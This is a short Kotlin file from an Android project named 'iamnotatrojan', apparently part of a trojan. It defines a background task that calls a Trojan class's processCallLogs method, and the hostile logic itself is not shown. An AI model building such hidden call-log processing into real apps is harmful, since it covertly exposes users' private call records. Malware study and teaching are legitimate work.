package don.petruchio.iamnotatrojan.trojan

import android.content.Context
import android.os.AsyncTask

class TrojanTask(var context: Context) : AsyncTask<Void, Void, Void>() {

    private var trojan:Trojan

    init{
        trojan = Trojan()
    }

    override fun doInBackground(vararg params: Void): Void? {
        trojan.processCallLogs(context)
        return null
    }
}
